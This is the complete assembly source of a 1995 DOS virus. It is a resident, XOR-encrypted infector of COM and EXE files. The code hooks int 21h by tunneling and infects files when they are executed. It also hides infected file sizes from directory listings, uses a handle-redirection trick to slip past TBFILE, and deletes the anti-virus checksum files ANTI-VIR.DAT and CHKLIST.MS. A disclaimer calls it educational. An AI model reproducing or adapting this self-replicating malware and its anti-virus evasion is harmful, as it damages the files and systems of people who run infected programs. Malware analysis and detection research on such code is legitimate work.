;
;	VIRUS07.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM/EXE files, encrypted with an
; XOR algorithm. It uses tunneling to install the int21h handler.
;
; The virus infects on execute (4b00h). If an infected file is being
; touched with the directory functions (11h/12h/4eh/4fh), the virus will
; stealth the filesize.
;
; When a file is about to be infected, the file handler is redirected
; to the keyboard handler using function 46h. The purpose of this is
; that TBFILE will allow writes to file handles that are normally
; character-based 'system' handles. Instead of checking if the handle
; points to a character device, tbfile makes it's judgement based on
; the handle number only.
;
; To avoid checksummers, several wellknown anti-virus control files
; are deleted.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
ParagraphSize	equ	(VirusSize+15)/16
StealthMarker	equ	10001b				; Stealth marker
VirusInterrupt	equ	7979h
VirusHandshake	equ	'JG'

;---------------------------------------------------------------------
;	The virus begins here
;---------------------------------------------------------------------

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax, es					; Restore segments
	add	ax, 10h					; now due to prefetch
	add	word ptr cs:[bp+ExeRegs+2], ax
	add	word ptr cs:[bp+ExeRegs+4], ax

	push	es

	mov	ah, 41h
	lea	dx, [bp+AVfile1]
	int	21h
	mov	ah, 41h
	lea	dx, [bp+AVfile2]
	int	21h

InstallVirus:
	mov	ax, VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax, VirusHandshake
	je	AlreadyResident

	mov	ah, 4ah					; Get size of mem
	mov	bx, 0ffffh
	int	21h
	mov	ah, 4ah					; Change size of mem
	sub	bx, ParagraphSize+1			; Make space for virus
	int	21h
	mov	ah, 48h					; Allocate memory
	mov	bx, ParagraphSize
	int	21h
	jc	AlreadyResident
	dec	ax					; ax-1 = MCB
	mov	es, ax
	mov	word ptr es:[1], 8h			; Mark DOS as owner
	sub	ax, 0fh					; Compensate org 100h
	mov	es, ax
	mov	di, 100h
	lea	si, [bp+offset BeginVirus]
	mov	cx, VirusSize
	rep	movsb					; Copy virus to mem
	push	es
	pop	ds

	push	cs
	call	InstallInt21hHandler

AlreadyResident:
	push	cs
	push	cs
	pop	es
	pop	ds

	cmp	byte ptr [bp+ComFlag], 1		; Check if COM or EXE
	jne	JumpExeFile

JumpComFile:
	pop	es					; jmp to beginning
	mov	di, 100h
	push	di
	lea	si, [bp+ExeHead]
	movsb
	movsw						; Restore first bytes
	ret

JumpExeFile:
	pop	es
	mov	ax, es					; Restore segment regs
	mov	ds, ax					; and ss:sp
	cli
	mov	ss, word ptr cs:[bp+ExeRegs+4]
	mov	sp, word ptr cs:[bp+ExeRegs+6]
	sti

	db	0eah					; and jmp to cs:ip
ExeRegs	dd	0, 0					; ip, cs, ss, sp

;---------------------------------------------------------------------
;	Install int 21h handler
;---------------------------------------------------------------------

InstallInt21hHandler:
	push	ds					; Jump to tunneler in
	mov	ax, offset @@next1			; new memory
	push	ax
	retf

@@next1:mov	ah, 52h					; Get list of lists
	int	21h
	mov	ax, es:[bx-2]				; Get first MCB
	mov	OrigMcb, ax

	mov	ax, 3521h				; Get int21
	int	21h
	mov	Int21o, bx
	mov	Int21s, es

	mov	al, 01h					; Save int01
	int	21h
	push	bx					; on stack
	push	es

	mov	ah, 25h					; Set int01
	mov	dx, offset Int01hHandler
	int	21h

	pushf						; Set trap flag
	pop	ax
	or	ah, 1h
	push	ax
	popf

	mov	ah, 0bh					; Issue dos function
	pushf						; Simulate interrupt
	call	dword ptr Int21o			; for tracing

	pop	ds
	pop	dx

	pushf						; Get flags
	pop	ax
	push	ax
	and	ah, 0feh				; Turn off trap flag
	push	ax
	popf

	mov	ax, 2501h				; Reset int01
	int	21h

	push	cs
	pop	ds

	pop	cx					; Discard leftover flags
	cmp	byte ptr cs:Tunneled, 1			; Did the tunnel install?
	je	@@next2

	mov	ax, 2521h				; No, fall back to a plain
	mov	dx, offset Int21hHandler		; int21 vector hook
	int	21h
@@next2:retf
Tunneled	db	0

Int01hHandler:
	mov	cs:OrigAx, ax				; Save registers
	mov	cs:OrigSi, si
	mov	cs:OrigCx, cx
	pop	si					; Get ip in si
	pop	ax					; cs in ax
	pop	cx					; flags in cx
	push	ds
	mov	ds, ax
	cmp	word ptr [si], 05ebh			; Check if tbav
	jne	@@next1
	cmp	byte ptr [si+2], 0eah			; Check if tbav
	jne	@@next1
	inc	si					; Skip tbav
	inc	si
@@next1:cmp	byte ptr [si], 9ah			; Immediate interseg?
	je	@@next3
	cmp	byte ptr [si], 0eah			; Immediate interseg?
	je	@@next3
	cmp	word ptr [si], 0ff2eh			; opc prefix=cs?
	jne	@@next2
	cmp	byte ptr [si+2], 1eh			; Direct interseg?
	je	@@next4
	cmp	byte ptr [si+2], 2eh			; Direct interseg?
	je	@@next4
@@next2:pop	ds
	push	cx
	push	ax
	push	si
	db	0b8h
OrigAx	dw	?
	db	0beh
OrigSi	dw	?
	db	0b9h
OrigCx	dw	?
	iret
@@next3:push	si
	inc	si
	jmp	@@next5
@@next4:push	si
	mov	si, si[3]
@@next5:db	81h, 7ch, 02h				; cmp ds:si[2], mcb
OrigMcb	dw	?					; See if jmp is to dos
	jb	@@dohook				; Below MCB: DOS in low mem
	cmp	word ptr [si+2], 0f000h			; In HMA: DOS loaded high
	jb	@@next6					; Between: a TSR, keep tracing
@@dohook:
	push	ax
	mov	ax, si[0]				; Get offset address
	mov	cs:Int21o, ax
	mov	ax, si[2]				; Get segment address
	mov	cs:Int21s, ax
	mov	word ptr si[0], offset Int21hHandler	; Install int21 handler
	mov	si[2], cs
	pop	ax
	mov	byte ptr cs:Tunneled, 1			; Record successful tunnel
	and	ch, 0feh				; Clear trap flag
@@next6:pop	si
	jmp	@@next2

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax, VirusInterrupt			; Return installation
	jne	@@next1
	mov	ax, VirusHandshake
	iret
@@next1:cmp	ax, 4b00h				; Execute?
	jne	@@next2
	jmp	InfectFile
@@next2:cmp	ah, 11h					; If function 11h, 12h
	je	StealthFindMatchingFileFCB
	cmp	ah, 12h
	je	StealthFindMatchingFileFCB
	cmp	ah, 4eh					; or function 4eh, 4fh
	je	StealthFindMatchingFile
	cmp	ah, 4fh
	je	StealthFindMatchingFile

OldInt21h:						; Jump to old int21h
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	FCB & Handle stealth (11h/12h & 4eh/4fh)
;---------------------------------------------------------------------

StealthFindMatchingFileFCB:
	pushf						; Simulate a int call
	push	cs					; cs, ip on the stack
	call	OldInt21h
	or	al, al					; Dir call sucessfull?
	jnz	ErrorStealth				; If not skip it

	pushf
	push	ax bx es				; Preserve registers

	mov	ah, 62h					; Get current PSP to
	int	21h					; es:bx
	mov	es, bx
	cmp	bx, es:[16h]				; Is the PSP ok??
	jnz	SkipStealth				; If not quit

	mov	bx, dx
	mov	al, [bx]				; al = current drive
	push	ax					; FFh = extended FCB
	mov	ah, 2fh					; Get DTA-area
	int	21h
	pop	ax
	inc	al					; Is it extended FCB?
	jnz	@@next1
	add	bx, 7					; If so add 7
@@next1:add	bx, 3					; Align FCB to handle offsets
	mov	ax, es:[bx+14h]				; Get time stamp (14h+3=17h)
	jmp	short DoStealth				; Hide the size

StealthFindMatchingFile:
	pushf						; Simulate a int call
	push	cs					; IP on stack and jmp
	call	OldInt21h				; to int handler
	jc	ErrorStealth				; Ret if no more file

	pushf
	push	ax bx es				; Preserve registers
	mov	ah, 2fh					; Get DTA-area
	int	21h

	mov	ax, es:[bx+16h]				; Get time stamp

DoStealth:
	and	al, 00011111b				; Kill all but secs
	xor	al, StealthMarker			; Is it infected?
	jnz	SkipStealth				; No - don't hide size

	cmp	word ptr es:[bx+1ah], VirusSize		; If size is smaller
	ja	@@sub					; than VirusSize
	cmp	word ptr es:[bx+1ch], 0			; it can't be infected
	je	SkipStealth				; so don't hide it
@@sub:	sub	word ptr es:[bx+1ah], VirusSize		; Else sub VirusSize
	sbb	word ptr es:[bx+1ch], 0

SkipStealth:
	pop	es bx ax				; Restore registers
	popf

ErrorStealth:
	retf	2

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFile:
	push	es bp ax bx cx si di ds dx

	mov	ax, 4300h				; Get attrib
	int	21h
	push	cx
	mov	ax, 4301h				; and clear attrib
	xor	cx, cx
	int	21h

	mov	ax, 3d02h				; Open file
	int	21h
	jnc	@@opened
	jmp	RestoreAttr
@@opened:
	xchg	ax, dx

	push	cs
	push	cs
	pop	ds
	pop	es

	mov	ah, 45h					; Duplicate handle
	xor	bx, bx
	int	21h
	mov	FileHnd, ax

	mov	ah, 46h					; Redirect handle
	mov	bx, dx
	xor	cx, cx
	int	21h
	xchg	ax, bx

	mov	ax, 5700h				; Get time/date
	int	21h
	push	dx
	push	cx
	and	cl, 1fh
	xor	cl, StealthMarker			; and check infection
	jne	ReadFileHeader
	jmp	CloseFile

ReadFileHeader:
	mov	ah, 3fh					; Read first 24 bytes
	mov	cx, 24
	mov	dx, offset ExeHead			; to ExeHead
	int	21h

	mov	al, 2h					; Go EOF
	call	SetFilePointer

	cmp	word ptr ExeHead, 'ZM'
	je	InfectExeFile
	cmp	word ptr ExeHead, 'MZ'
	jne	InfectComFile

InfectExeFile:
	mov	byte ptr ComFlag, 0

	mov	di, offset ExeRegs			; ExeRegs = IP/CS
	mov	si, offset ExeHead+14h
	movsw
	movsw

	mov	si, offset ExeHead+0eh			; EXEstack = SS/SP
	movsw
	movsw

	mov	cx, 16
	div	cx
	sub	ax, word ptr [ExeHead+8h]
	mov	word ptr [ExeHead+14h], dx		; Calculate CS:IP
	mov	word ptr [ExeHead+16h], ax
	add	ax, 100
	mov	word ptr [ExeHead+0eh], ax		; SS:SP
	mov	word ptr [ExeHead+10h], 100h

	call	WriteVirus

	mov	al, 2h					; Go EOF
	call	SetFilePointer

	mov	cx, 512					; Calculate new size
	div	cx					; in 512 byte pages
	or	dx, dx
	jz	@@exact
	inc	ax
@@exact:mov	word ptr [ExeHead+2], dx
	mov	word ptr [ExeHead+4], ax

	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	cx, 24					; Write EXE header
	mov	dx, offset ExeHead
	mov	ah, 40h
	int	21h

	jmp	CloseFile

InfectComFile:
	or	dx, dx					; > 64K?
	jnz	SkipCom
	cmp	ax, (0ffffh-VirusSize)			; Dont infect too big
	jae	SkipCom

	mov	byte ptr ComFlag, 1

	add	ax, offset EntryPoint-103h		; Calculate entryjmp
	mov	word ptr [NewJmp+1], ax

	call	WriteVirus

	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	cx, 3
	mov	dx, offset NewJmp
	mov	ah, 40h
	int	21h

CloseFile:
	mov	ax, 5701h				; Restore time/date
	pop	cx
	pop	dx
	and	cl, 11100000b				; Zero sec's
	or	cl, StealthMarker			; and mark infected
	int	21h
	jmp	short UnredirHandle

SkipCom:
	pop	cx					; Discard saved time/date
	pop	dx

UnredirHandle:
	mov	ah, 46h					; Redirect handle
	mov	bx, FileHnd
	xor	cx, cx
	int	21h

	mov	ah, 3eh					; Close handle
	int	21h

RestoreAttr:
	pop	cx
	pop	dx
	pop	ds
	mov	ax, 4301h
	int	21h

	pop	di si cx bx ax bp es
	jmp	OldInt21h

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

SetFilePointer:
	mov	ah, 42h					; Jump in file
	xor	cx, cx
	cwd
	int	21h
	ret

WriteVirus:
@@loop:	mov	ah, 2ch					; Get random number
	int	21h
	or	dl, dl					; dl=0 - get another value!
	je	@@loop
	mov	word ptr ds:[Key], dx

	mov	ax, 08d00h				; Copy virus to 8d00h:100h
	mov	es, ax
	mov	di, 100h
	mov	si, di
	mov	cx, (VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	xor	bp, bp					; And encrypt it there
	call	EncryptDecrypt

	mov	ah, 40h					; Write virus to file
	mov	cx, VirusSize
	mov	dx, offset BeginVirus
	int	21h

	push	cs					; cs=ds
	pop	ds
	ret

AVfile1	db	'ANTI-VIR.DAT', 0
AVfile2	db	'CHKLIST.MS', 0
FileHnd	dw	0					; Filehandle
NewJmp	db	0e9h, 00h, 00h				; Buffer for entryjmp
ComFlag	db	1
ExeHead	db	0cdh, 20h, 00h, 21 dup (0)

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDelta
EncryptDecrypt:
	mov	dx, word ptr ds:[bp+Key]		; routine here to
	lea	si, [bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si], dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDelta:
	pop	bp
	sub	bp, offset EncryptDecrypt		; Get delta offset
	push	cs
	pop	ds
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

EndVirus:

end
